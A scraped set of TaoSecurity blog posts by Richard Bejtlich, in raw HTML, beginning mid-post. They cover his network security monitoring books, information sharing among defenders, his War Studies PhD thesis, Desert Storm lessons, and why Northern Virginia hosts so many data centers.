src=""https://2.bp.blogspot.com/-kPZLX1vrcP4/WJyAXGNIFOI/AAAAAAAAdq0/zI4BoDpEZ9M8AXjcklam06s9DakIy9YPACLcB/s200/41Giiqi1MwL._SL250_.jpg"" width=""152"" /></a>The Tao lists as 832 pages.

Because Extrusion is tied more closely with data types, and less with specific software, I think it has aged better in this respect.<br /><br />The introduction describes Extrusion using these words:<br /><br /><i>Part I mixes theory with architectural considerations. &nbsp;Chapter 1 is a recap of the major theories, tools, and techniques from The Tao. &nbsp;It is important for readers to understand that NSM has a specific&nbsp;</i><i>technical meaning and that NSM is not the same process as intrusion detection. &nbsp;Chapter 2 describes the architectural requirements for designing a network best suited to control, detect, and respond to intrusions. &nbsp;Because this chapter is not written with specific tools in mind, security architects can&nbsp;</i><i>implement their desired solutions regardless of the remainder of the book. &nbsp;Chapter 3 explains the theory of extrusion detection and sets the stage for the remainder of the book. &nbsp;Chapter 4 describes how to gain visibility to internal traffic. &nbsp;Part I concludes with Chapter 5, original material by Ken Meyers explaining how internal network design can enhance the control and detection of internal threats.</i><br /><i><br /></i><i>Part II is aimed at security analysts and operators; it is traffic-oriented and requires basic understanding of TCP/IP and packet analysis. &nbsp;Chapter 6 offers a method of dissecting session and full content data to unearth unauthorized activity. &nbsp;Chapter 7 offers guidance on responding to intrusions, from a network-centric perspective. &nbsp;Chapter 8 concludes part III by demonstrating principles of network forensics.</i><br /><i><br /></i><i>Part III collects case studies of interest to all types of security professionals. &nbsp;Chapter 9 applies the lessons of Chapter 6 and explains how an internal bot net was discovered using Traffic Threat Assessment. &nbsp;Chapter 10 features analysis of IRC bot nets, contributed by LURHQ analyst Michael Heiser.&nbsp;</i><br /><i><br /></i><i>An epilogue points to future developments. &nbsp;The first appendix, Appendix A, describes how to install Argus and NetFlow collection tools to capture session data. &nbsp;Appendix B explains how to install a minimal Snort deployment in an emergency. &nbsp;Appendix C, by Tenable Network Security founder Ron Gula, examines the variety of host and vulnerability enumeration techniques available in commercial and open source tools. &nbsp;The book concludes with Appendix D, where Red Cliff Consulting expert Rohyt Belani offers guidance on internal host enumeration using open source tools.</i><br /><div><br /></div><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://4.bp.blogspot.com/-HX6OzlEXPBo/WJyDWMs3eHI/AAAAAAAAdrM/gZqjksiWk34dW1tN36hOeJ6oNsQ07F_jgCLcB/s1600/rdf.jpg"" style=""clear: left; float: left; margin-bottom: 1em; margin-right: 1em;""><img border=""0"" height=""200"" src=""https://4.bp.blogspot.com/-HX6OzlEXPBo/WJyDWMs3eHI/AAAAAAAAdrM/gZqjksiWk34dW1tN36hOeJ6oNsQ07F_jgCLcB/s200/rdf.jpg"" width=""151"" /></a></div><div>At the same time I was writing Tao and Extrusion, I was collaborating with my friends and colleagues Keith Jones and Curtis Rose on a third book, <a href=""https://www.amazon.com/gp/product/0321240693/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0321240693&amp;linkCode=as2&amp;tag=taosecurity0c-20&amp;linkId=e61e960ef47b23201d4fc7899f19a1da%22%3EReal%20Digital%20Forensics:%20Computer%20Security%20and%20Incident%20Response%3C/a%3E%3Cimg%20src=%22//ir-na.amazon-adsystem.com/e/ir?t=taosecurity0c-20&amp;l=am2&amp;o=1&amp;a=0321240693"">Real Digital Forensics: Computer Security and Incident Response</a>.

However, in 2012 I taught a class for Black Hat in Abu Dhabi. I realized many of the students lacked the fundamental understanding of how networks operated and how network security monitoring could help them detect and respond to intrusions. I decided to write a book that would explain NSM from the ground up. While I assumed the reader would have familiarity with computing and some security concepts, I did not try to write the book for existing security experts.</div><div><br /></div><div>The result was <a href=""https://www.amazon.com/gp/product/1593275099/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1593275099&amp;linkCode=as2&amp;tag=taosecurity0c-20&amp;linkId=37516eede6929bd6dfa0b833f7cf1890%22%3EThe%20Practice%20of%20Network%20Security%20Monitoring:%20Understanding%20Incident%20Detection%20and%20Response%3C/a%3E%3Cimg%20src=%22//ir-na.amazon-adsystem.com/e/ir?t=taosecurity0c-20&amp;l=am2&amp;o=1&amp;a=1593275099"">The Practice of Network Security Monitoring: Understanding Incident Detection and Response</a>. If you are new to NSM, this is the first book you should buy and read. It is a very popular title and it distills my philosophy and practice into the most digestible form, in 376 pages.</div><div><br /></div><div>The main drawback of the book is the integration of Security Onion coverage. SO is a wonderful open source suite, partly because it is kept so current. That makes it difficult for a print book to track changes in the software installation and configuration options. While you can still use PNSM to install and use SO, you are better off relying on Doug Burks' excellent online documentation.&nbsp;</div><div><br /></div><div>PNSM is an awesome resource for learning how to use SO and other tools to detect and respond to intrusions. I am particularly pleased with chapter 9, on NSM operations. It is a joke that I often tell people to ""read chapter 9"" when anyone asks me about CIRTs.</div><div><br /></div><div>The introduction describes PNSM using these words:</div><div><br /></div><div><div><i>Part I, “Getting Started,” introduces NSM and how to think about sensor&nbsp;</i><i>placement.</i></div><div><i><br /></i></div><div><i>• Chapter 1, “Network Security Monitoring Rationale,” explains why&nbsp;</i><i>NSM matters, to help you gain the support needed to deploy NSM in&nbsp;</i><i>your environment.</i></div><div><i>• Chapter 2, “Collecting Network Traffic: Access, Storage, and Management,”</i><i>addresses the challenges and solutions surrounding physical&nbsp;</i><i>access to network traffic.</i></div><div><i><br /></i></div><div><i>Part II, “Security Onion Deployment,” focuses on installing SO on&nbsp;</i><i>hardware and configuring SO effectively.</i></div><div><i><br /></i></div><div><i>• Chapter 3, “Stand-alone NSM Deployment and Installation,” introduces&nbsp;</i><i>SO and explains how to install the software on spare hardware to gain&nbsp;</i><i>initial NSM capability at low or no cost.</i></div><div><i>• Chapter 4, “Distributed Deployment,” extends Chapter 3 to describe&nbsp;</i><i>how to install a dispersed SO system.</i></div><div><i>• Chapter 5, “SO Platform Housekeeping,” discusses maintenance activities&nbsp;</i><i>for keeping your SO installation running smoothly.&nbsp;</i></div><div><i><br /></i></div><div><i>Part III, “Tools,” describes key software shipped with SO and how to&nbsp;</i><i>use these applications.</i></div><div><i><br /></i></div><div><i>• Chapter 6, “Command Line Packet Analysis Tools,” explains the key&nbsp;</i><i>features of Tcpdump, Tshark, Dumpcap, and Argus in SO.</i></div></div><div><div><i>• Chapter 7, “Graphical Packet Analysis Tools,” adds GUI-based software&nbsp;</i><i>to the mix, describing Wireshark, Xplico, and NetworkMiner.</i></div><div><i>• Chapter 8, “NSM Consoles,” shows how NSM suites, like Sguil, Squert,&nbsp;</i><i>Snorby, and ELSA, enable detection and response workflows.</i></div><div><i><br /></i></div><div><i>Part IV, “NSM in Action,” discusses how to use NSM processes and data&nbsp;</i><i>to detect and respond to intrusions.</i></div><div><i><br /></i></div><div><i>• Chapter 9, “NSM Operations,” shares my experience building and leading&nbsp;</i><i>a global computer incident response team (CIRT).</i></div><div><i>• Chapter 10, “Server-side Compromise,” is the first NSM case study,&nbsp;</i><i>wherein you’ll learn how to apply NSM principles to identify and validate&nbsp;</i><i>the compromise of an Internet-facing application.</i></div><div><i>• Chapter 11, “Client-side Compromise,” is the second NSM case study,&nbsp;</i><i>offering an example of a user being victimized by a client-side attack.</i></div><div><i>• Chapter 12, “Extending SO,” concludes the main text with coverage of&nbsp;</i><i>tools and techniques to expand SO’s capabilities.</i></div><div><i>• Chapter 13, “Proxies and Checksums,” concludes the main text by&nbsp;</i><i>addressing two challenges to conducting NSM.</i></div><div><i><br /></i></div><div><i>The Conclusion offers a few thoughts on the future of NSM, especially&nbsp;</i><i>with respect to cloud environments.&nbsp;</i></div><div><i><br /></i></div><div><i>The Appendix, “SO Scripts and Configuration,” includes information&nbsp;</i><i>from SO developer Doug Burks on core SO configuration files and control&nbsp;</i><i>scripts.</i></div></div><div><br /></div><div>I hope this post helps explain the different books I've written, as well as their applicability to modern security scenarios.</div><br /><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2017/02/bejtlich-books-explained.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

2016-10-18 23:17:49+08:00,Five Ways That Good Guys Share More Than Bad Guys,TaoSecurity,"It takes a lot for me to write a cybersecurity blog post these days. I spend most of my writing time working on my <a href=""https://taosecurity.blogspot.com/2016/06/updated-phd-thesis-title.html"">PhD</a>. Articles like <a href=""http://www.bloomberg.com/news/articles/2016-10-18/nothing-unites-banks-like-the-threat-of-hackers-and-cybercrime"">Nothing Brings Banks Together Like A Good Hack</a> drive me up the wall, however, and a Tweet rant is insufficient. What fired me up, you might ask? Please read the following excerpt:<br /><i><br /></i><i>[Troels] Oerting, with no small dose of grudging admiration, says his adversaries excel at something that can’t be addressed with deep pockets or killer software: They’re superb networkers. “<b>The organized crime groups in cyber are sharing much better than we are at the moment,” </b>says Oerting, a Dane with a square jaw and the watchful eyes of a cop who’s investigated the underworld for 35 years.<b> “They are sharing methodologies, knowledge, tools, practices—what works and what doesn’t.”</b></i><br /><br />Statements like these are regularly submitted without evidence. In response, I provide five sources of evidence why&nbsp;organized crime groups do <b>not </b>share more than defenders.<br /><br /><b>1. Solution providers share.</b> Both commercial and not-for-profit solution providers share enormous amounts of information on the security landscape. Some of it is free, and some of it is sold as products or consulting. Thousands of security companies and not-for-profit providers compete for your attention, producing white papers, Webinars, and other resources. You might argue that all of them claim to be the answer to your problem. However, this situation is infinitely better than the 1980s and early 1990s. Back then, hardly any solutions, or even security companies and organizations, existed at all.<br /><br />Criminal solution providers share, but they do so by selling their wares. This is true for the open world as well, but the volume of the open world is orders of magnitude greater.<br /><br /><b>2. Government agencies share.</b> My fellow Americans, has your organization you been visited by the FBI?&nbsp;<a href=""https://www.washingtonpost.com/world/national-security/2014/03/24/74aff686-aed9-11e3-96dc-d6ea14c099f9_story.html"">Federal agents notified more than 3,000 U.S. companies [in 2013] that their computer systems had been hacked</a>. The agents didn't just walk in, drop a letter, and leave. If a relationship did not exist previously, it will now be developed.<br /><br />Beyond third party breach notifications, agencies such as NIST, DHS, and others regularly share information with organizations. They may not share as much as we would like, but again, historical perspective reveals great progress.<br /><br /><b>3. Books, articles, and social media share. </b>The amount of readable material on security is astounding. Again, in the late 1980s and early 1990s hardly any books or articles were available. Now, thousands of resources exist, with new material from publishers like <a href=""https://www.nostarch.com/catalog/security"">No Starch</a> arriving monthly. Where are the books written by the underground?<br /><br /><b>4. Security conferences share. </b>You could spend every week of the year at a security conference. If you happen to miss a talk, it's likely the incomparable <a href=""http://www.irongeek.com/"">Iron Geek</a> recorded it. Does the underground offer similar opportunities?<br /><br /><b>5. Private groups and limited information exchange groups share.</b>&nbsp;A final category of defender sharing takes place in more controlled settings. These involve well-established Information Sharing and Analysis Centers (ISACs), developing&nbsp;Information Sharing and Analysis Organizations (ISAOs), and private mailing lists and forums with limited membership. These could possibly be the closest analogue to the much-esteemed underground. Even if you disregard points 1-4 above, the quality of information shared in this final category absolutely equals, if not exceeds, anything you would find in the criminal world.<br /><br />If you disagree with this analysis, and continue to lament that bad guys share more than the good guys, what evidence can you provide?<div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2016/10/five-ways-that-good-guys-share-more.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

One of my colleagues Ben Buchanan subsequently contacted me via Twitter and we exchanged a few messages. He prompted me to think about the title.<br /><br />Later I ruminated on the title of a recent book by my advisor, Dr. Thomas Rid. He wrote <a href=""https://ridt.co/cyber-war-will-not-take-place/"">Cyber War Will Not Take Place</a>. One of the best parts of the book is the title. In six words you get his argument as succinctly as possible. (It could be five words if you pushed ""cyber"" and ""war"" together, but the thought alone makes me cringe, in the age of cyber-everything.)<br /><br />I wondered if I could transform my latest attempt at a thesis title into something that captured my argument in a succinct form.<br /><br />I thought about the obsession of the majority of the information security community on the tool and tactics level of war. Too many technicians think about security as a single-exchange contest between an attacker and a defender, like a duel.<br /><br />That reminded me of a problem I have with Carl von Clausewitz's definition of war.<br /><br /><i>We shall not enter into any of the abstruse definitions of war used by publicists. We shall keep to the element of the thing itself, to a duel. <b>War is nothing but a duel on an extensive scale.</b></i><br /><br />- <a href=""https://www.clausewitz.com/readings/OnWar1873/BK1ch01.html"">On War, Chapter 1</a><br /><br />Clausewitz continues by mentioning ""the countless number of duels which make up a war,"" and then makes his famous statement that ""War therefore is an act of violence to compel our opponent to fulfill our will."" However, I've never liked the tactically-minded idea that war is a ""duel.""<br /><br />This concept, plus the goal to deliver a compact argument, inspired me to revise my thesis title and subtitle to the following:<br /><br /><b>Campaigns, Not Duels: The Operational Art of Cyber Intrusions</b><br /><br />In the first three words I deliver my argument, and in the subtitle I provide context by including my key perspective (""operational art""), environment (""cyber,"" yes, a little part of me is dying, but it's a keyword), and ""intrusions.""<br /><br />When I publish the thesis as a book in 2018, I hope to use the same words in the book title.<div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2016/06/updated-phd-thesis-title.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

Distilled, these assumptions are that attacks occur at blinding speed with immediate consequences, that victims are essentially negligent, and that offensive initiative dominates defensive reaction.&nbsp;</div><div class=""MsoNormal"">This thesis examines these assumptions through two research questions. First, what characterizes network intrusions at different levels of war? Second, what role does operational art play in network intrusion campaigns?&nbsp;</div><div class=""MsoNormal"">By analyzing incident reports and public cases, the thesis refutes the assumptions and leverages the results to improve strategy.&nbsp;&nbsp;</div><div class=""MsoNormal"">The thesis reveals that strategically significant attacks are generally not ""speed-of-light"" events, offering little chance for recovery.&nbsp; Digital defenders are hampered by a range of constraints that reduce their effectiveness while simultaneously confronting intruders who lack such restrictions. Offense does not necessarily overpower defense, constraints notwithstanding, so long as the defenders conduct proper counter-intrusion campaigns.&nbsp;</div><div class=""MsoNormal"">The thesis structure offers an introduction to the subject, and an understanding of cybersecurity challenges and trade-offs. It reviews the nature of digital intrusions and the levels of war, analyzing the interactions at the levels of tools/tactics/technical details, operations and campaigns, and strategy and policy. The thesis continues by introducing historical operational art, applying lessons from operational art to network intrusions, and applying lessons from network intrusions to operational art. The thesis concludes by analyzing the limitations of operational art in evolving digital environments.<br /><br />*See the post <a href=""http://taosecurity.blogspot.com/2016/06/updated-phd-thesis-title.html"">Updated PhD Thesis Title</a> for details on the new title.</div><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2016/06/latest-phd-thesis-title-and-abstract.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

Three aspects caught my attention. I will share them here.<br /><br />First, Lt Gen Deptula said that Desert Storm introduced five changes to the character of warfare. I noted that he used the term ""character,"" and not ""nature."" If you are a student of warfare and/or strategy, you are most likely in the camp that says warfare has an unchanging nature, although its character can change. This is the Clausewitz legacy. A minority camp argues that warfare can change both nature and character.<br /><br />Second, turning to the five changes introduced by Desert Storm, Lt Gen Deptula listed the following.<br /><br />1. <b>Desert Storm introduced ""expectations of low casualties, for both sides</b>."" I agree with the expectation of low casualties for the US, but I don't think low Iraqi casualties were a primary concern. One could argue that stopping the war during the ""highway of death"" showed the US didn't want to inflict large casualties on the Iraqi forces, but I still think low casualties were primarily a concern for US troops.<br /><br />2. <b>Desert Storm ""normalized precision."" </b>Even though a minority of the ordnance delivered during the war were precision weapons, their use steadily increased throughout all later conflicts.<br /><br />3. <b>Desert Storm introduced joint and combined organization and execution</b>. This was indeed quite a step forward, although I recall reading that that USMC airpower took measures to remain as separate as possible.<br /><br />4. <b>Desert Storm put the concepts of ""effect-based operations"" into action.</b>&nbsp;There is no doubt about this one. Lt Gen Deptula talks about a disagreement with Gen Schwartzkopf's staff concerning disabling the Iraqi power grid. Air power achieved the effect of disabling the grid within 3-4 days, but Schwartzkopf's team used traditional attritional models, noting that less than a certain percentage of destruction mean mission failure. Deptula was right; they were wrong.<br /><br />5. <b>Desert Storm was the first major conflict where airpower was the centerpiece and key force.</b>&nbsp;Call me biased, and no disrespect to the land forces in the Gulf, but I agree with this one.<br /><br />The third and final noteworthy element of the interview involved Lt Gen Deptula's opinion of Islamic State. He said ""it's not an insurgency. IS is a state."" He said IS possesses the five elements of a state, namely:<br /><br />1. <b>Leadership</b><br />2. <b>Key essential systems</b><br />3. <b>Infrastructure</b><br />4. <b>Population</b><br />5. <b>Fielded military forces</b><br /><br />I agree with his assessment. I also believe that Western leaders are unwilling to grant IS the legitimacy of it being a state, so they persist in calling IS names like ISIS, ISIL, Daesh, and so on. I see no problem with that approach, since it incorporates political sensitivities. However, that approach also aggravates the perception that Western leaders are out of touch with reality.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2016/01/lt-gen-david-deptula-on-desert-storm.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

In this post I will try to answer your questions by explaining how I got to this point and my overall impressions about the program.<br /><br /><b>My Academic Background</b><br /><br />I have bachelor's of science degrees in history and political science from the US Air Force Academy, and a master's degree in public policy from the Harvard Kennedy School. My last formal academic training ended in 1997 when I graduated from the Air Force Intelligence Officers Training Course.<br /><br /><b>Why a PhD?</b><br /><br />I seriously began considering working on my PhD in 2006, when I was an independent consultant. I've guest lectured at dozens of schools over the years, and taught hundreds of students through my Black Hat courses. I thought the PhD experience would open more doors for future academic opportunities, and I welcomed the opportunity to make an original contribution to the literature.&nbsp;In more recent years I've testified to Congress and worked with think tanks, and in both environments PhDs are common.<br /><br /><b>My First PhD Choice</b><br /><br />After reading <a href=""http://www.cl.cam.ac.uk/~rja14/book.html"">Security Engineering</a>&nbsp;(the first edition), I was a fan of Dr Ross Anderson at the University of Cambridge Computer Laboratory. I contacted him, as well as some of his PhD candidates. They invited me to guest lecture at the lab, which I did in May 2006. I considered the possibility of doing research on network security motioning. I liked the idea of the ""British system,"" which emphasized practical research, no coursework, and a high degree of independence. I would have to move my family to the UK.<br /><br />In the spring of 2007, however, I made contact with my future boss at General Electric. I decided instead to <a href=""http://taosecurity.blogspot.com/2007/06/bejtlich-joining-general-electric-as.html"">join GE as director of incident response</a>. It was too good an opportunity. That put my PhD plans on hold.<br /><br /><b>A New Direction</b><br /><br />In the fall of 2012 I listened to a 24 lecture series titled <a href=""http://www.thegreatcourses.com/courses/masters-of-war-history-s-greatest-strategic-thinkers.html"">Masters of War: History's Greatest Strategic Thinkers</a> by Professor Andrew R. Wilson of the Naval War College. Dr. Wilson reintroduced me to the strategists I had learned about as a cadet twenty years earlier, and kindled a deep interest in strategic history, thought, and practice. I began looking for military history and strategy programs, starting with this list maintained by the <a href=""http://www.smh-hq.org/grad/gradguide/degree.html"">Society for Military History</a>.<br /><br />In the summer of 2013, The Economist magazine asked if I would participate in an online&nbsp;<a href=""https://web.archive.org/web/20150109012154/http://www.economist.com/debate/days/view/997"">debate</a>&nbsp;with Dr Thomas Rid, author of <a href=""http://www.amazon.com/Cyber-War-Will-Take-Place-ebook/dp/B00ET38G9G/ref=mt_kindle?_encoding=UTF8&amp;me="">Cyber War Will Not Take Place</a>. After the debate I read Thomas' book, and learned he was a professor in the KCL War Studies department. I enjoyed the debating process and Thomas' book, so I decided to contact him and some of his PhD candidates to learn more about the PhD program.<br /><br />During that process, FireEye acquired Mandiant in late December 2013. I decided to change roles and become a full-time strategist, inspired by my changing interests and Prof Wilson's course. That decision definitively shifted my focus away from tools and tactics, and towards operations/campaigns and strategy.<br /><br /><b>My Final PhD Choice</b><br /><br />In early 2014 I connected with <a href=""https://www.linkedin.com/in/robert-m-lee-b2096532"">Rob Lee</a>, who had started his PhD with Thomas in the fall of 2013. Speaking with Thomas and Rob, I learned the KCL War Studies PhD was even more to my liking than the Cambridge program. KCL also&nbsp;emphasized practical research, no coursework, and a high degree of independence. I would not have to move my family to the UK, but I would have to be very disciplined and stay in contact with my advisor and colleagues.<br /><br />I applied to the program to meet the spring 2014 deadline, with enrollment in fall 2014. I was accepted and started the program in the fall of 2014, while still maintaining my day job at Mandiant and FireEye.<br /><br /><b>The Thesis</b><br /><br />The desired output for the KCL PhD is a thesis, a 80,000 to 100,000 word work with a goal of eventual publication as a book. Since I was already considering writing my fifth book, this seemed an excellent way to accomplish that goal. Others might find this a scary proposition, but I always enjoyed self-paced research, and the opportunity to devise and answer original research questions was appealing.<br /><br /><b>Milestones</b><br /><br />I will shift my focus slightly to those who might be interested in applying to the program. The PhD program offers three major milestones. First, one must be accepted to the program. I recommend perusing the list of <a href=""http://www.kcl.ac.uk/sspp/departments/warstudies/people/index.aspx"">people</a> to find faculty and current students with interests similar to yours. Contact them via email to identify possible advisors and colleagues. If you aren't able to attract any interest, it's a sign you might not have a topic suitable for a PhD. That's a personal judgement, of course.<br /><br />I approached the application process very seriously. I took several months to complete it and submitted my <a href=""http://www.brookings.edu/research/papers/2014/05/07-strategy-not-speed-digital-defenders-early-cybersecurity-thinkers-bejtlich"">Strategy, Not Speed</a>&nbsp;piece as my writing sample. Thankfully I was accepted!<br /><br />Once in the program, the second major milestone is called the ""mini viva"" or the ""upgrade."" Prior to passing this milestone, as I understand it, one is not technically a PhD candidate yet. One must write a document of about 20,000 words that includes a thesis abstract, outline, introductory chapter, sample chapter, and completion work plan. The student must then defend that document, live, in front of a panel. I passed that stage of my PhD journey late last year.<br /><br />The third and final major milestone is the ""viva"" or the defense of the completed thesis. I am several years away from this step, but I expect it to be an extended version of the upgrade process. Remember that one of the purposes of a PhD is to demonstrate the ability to produce high-level, independent research, so I expect my viva to reflect that philosophy.<br /><br /><b>My Experience</b><br /><b><br /></b>My experience thus far has been excellent and I plan to continue. However, I would like to highlight a few aspects of my situation. First, I am doing research independently, not at the Strand campus in central London. Several of my colleagues are there now, and they have daily access to a whole world of academic experiences that are unavailable to remote students. If you want a campus experience, you should study in London.<br /><br />Second, I am still working my day job and being a husband and father, which are my priorities. That means I have to be very careful about &nbsp;how I manage my time. I felt that I could handle the situation, based on my experience writing and publishing <a href=""https://nostarch.com/nsm"">my last book</a>. I started writing my last NSM book in January 2013 and had it ready for Black Hat in late July that year, during the time when Mandiant released the <a href=""http://intelreport.mandiant.com/"">APT1 report</a>.<br /><br />Third, my thesis, the nature of counter-intrusion campaigns, dovetails well with my day job and professional interests. I would not be able to pursue a PhD in a field not related to my professional life -- I simply wouldn't have the time for research. Because my research matches the needs and interests of my employer, the work I do for Mandiant and FireEye frequently doubles as research for my PhD. Obviously I have a very flexible employer who supports my research, and for that I am grateful.<br /><br />Fourth, although I am independent, thanks to the initiative of colleagues in the DC area, I am not alone. Last month one of us started a group for War Studies students in the DC area, and we plan to have monthly meetings. I also try to meet with KCL personnel (students or faculty) if we happen to be in the same part of the world at the same time. I started a Slack channel but it hasn't really yet taken off.<br /><br /><b>Recommended Reading</b><br /><br />In addition to reading the <a href=""http://www.kcl.ac.uk/index.aspx"">KCL</a> and <a href=""http://www.kcl.ac.uk/sspp/departments/warstudies/index.aspx"">War Studies</a> Web sites, I suggest reading <a href=""http://www.amazon.com/Authoring-PhD-Thesis-Doctoral-Dissertation/dp/1403905843/"">Authoring a PhD</a> by Patrick Dunleavy. It is generally aimed at the British PhD process, focusing on the so-called ""big book"" thesis. &nbsp;If you find the sort of research and writing described in that book to be exciting, then a KCL PhD might be for you.<br /><br /><b>Conclusion</b><br /><b><br /></b>In brief, I recommend the KCL War Studies PhD if you meet the following requirements:<br /><br /><ul><li>You have a suitable undergraduate background, temperament, and social and financial situation, such that you are capable of independent research at the highest level.</li><li>You have an interest that syncs with at least one possible advisor in the department.</li><li>You are committed to researching for several years, and writing 80,000-100,000 words on your subject, answering research questions to make original academic and practical contributions to the field.</li></ul><br />I may add updates to this post, or simply add them as comments or as answers to questions.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2016/01/why-war-studies-phd.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

This is also my 3,000th blog post.<br /><br />I wrote my&nbsp;<a href=""http://taosecurity.blogspot.com/2003/01/welcome-to-my-blog-main-new-content.html"">first post</a>&nbsp;on 8 January 2003 while working as an incident response consultant for Foundstone. Kevin Mandia was my boss. Today I am starting my third year as Chief Security Strategist at&nbsp;<a href=""http://www.fireeye.com/"">FireEye</a>, still working for Kevin Mandia. (It's a small world. In April I will hit my five year anniversary with the Mandiant part of FireEye.)<br /><br />In 2015 my blogging frequency increased dramatically, with 55 posts, more than double my 2014 total of 23 and triple my 2013 output of 18. In 2012 I posted 60 stories, so I was close to that level in 2015. It's still nothing like my writing from 2003-2011 however!<br /><br />Why the drop over the years? I ""blame"" my&nbsp;<a href=""https://twitter.com/taosecurity"">@taosecurity</a>&nbsp;Twitter account. With almost 36,000 followers, easy posting from mobile devices, and greater interactivity, Twitter is an addictive platform. I have authored roughly 16,000 Tweets since first posting in July 2009.<br /><br />Second, blogging used to be the primary way I could share my ideas with the community. These days, speaking and writing are a big part of my professional duties. I try to track media reports&nbsp;<a href=""http://www.taosecurity.com/press.html"">here</a>&nbsp;and I archive my non-blog writing at my <a href=""https://brookings.academia.edu/RichardBejtlich"">Academia.edu account</a>.<br /><br />Third, time is precious, and blogging often takes a back seat. I'd rather spend time with my family, write and research my PhD, collaborate with think tanks, and so on.<br /><br />I still plan to keep blogging in 2016. Twitter's only a 140 character platform, and some days I have the time and inclination to share a few thoughts beyond what I've said or written for work. I have to decide if I want to write about strategy here, or move to another location.<br /><br />Thanks you to Google for providing me this free platform for the past 13 years, and to you for reading what I post. I'm one of the few original ""security bloggers"" still active, though not writing in the same way as I did in 2003.<br /><br />I realize my transition from technical details to strategic considerations has alienated some readers, but I am comfortable with my interests and I believe the greater security community needs to hear from people who think outside the tools and tactics box. This is especially true when the majority of the security community isn't aware they are inside such a box, or that there is another set of ideas and people available to contribute to the world's digital safety and security.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2016/01/happy-13th-birthday-taosecurity-blog.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

The text said the following:<br /><br /><i>Cloud leaders including Amazon.com, Microsoft, Google, IBM, and upstart DigitalOcean are spending tens of billions of dollars to construct massive data centers around the world. Microsoft alone puts its total bill at $15 billion. There are two main reasons for the expansion: First, the companies have to set up more servers near the biggest centers of Internet traffic growth. Second, they increasingly have to wrestle with national data-privacy laws and customer preferences, either by storing data in a user’s home country, or, in some cases, avoiding doing just that.</i><br /><i><br /></i>The article featured several maps, including the one at left. It notes data centers in ""Virginia"" because ""the Beltway has massive data needs."" That may be true, but it does not do justice to the history of the Internet in Northern Virginia (NoVA), nor does it explain why there are so many data centers in NoVA. I want to briefly note why there is so much more to this story.<br /><br />In brief, there are so many data centers in NoVA because, 25 years or so ago, early Internet companies located in the area and also decided to connect their networks in NoVA. Key players included America Online (AOL), which built its headquarters in Loudoun County in the early 1990s. About the same time, in 1992, Internet pioneers from several local companies decided to connect their networks and build what became known as <a href=""https://en.wikipedia.org/wiki/MAE-East"">MAE-East</a>. A year later, the National Science Foundation awarded a contract designating MAE-East as one of four <a href=""https://en.wikipedia.org/wiki/Network_Access_Point"">Network Access Points</a>. Later in the 1990s <a href=""https://blog.equinix.com/2014/12/ashburn-a-data-center-boomtown-that-keeps-booming/"">Equinix</a> arrived and contributed to the growth in data center and network connectivity that continues through the present.<br /><br />Essentially, NoVA demonstrated real-life ""network effects"" -- with networks cross-connecting to each other in Ashburn and Loudoun County, it made sense for new players to gain access to those connections. Companies built data centers there because the network connections offered the best performance for their customers. The ""Beltway"" and its ""massive data needs"" were not the reason.<br /><br />If you would like to know more, I recommend reading Andrew Blum's book&nbsp;<a href=""http://www.amazon.com/Tubes-Journey-Internet-Andrew-Blum-ebook/dp/B006FOHWDI/"">Tubes: A Journey to the Center of the Internet</a>. Yes, Blum is referring to those ""tubes,"" which he investigates via in-person visits to notable Internet locations and refreshing historical research. Along the way, Blum charts the growth of NoVA as an Internet hub, in some ways, ""the"" Internet hub.<br /><br /><a class=""twitter-share-button"" href=""http://twitter.com/share"">Tweet</a><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2015/12/a-brief-history-of-internet-in-northern.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

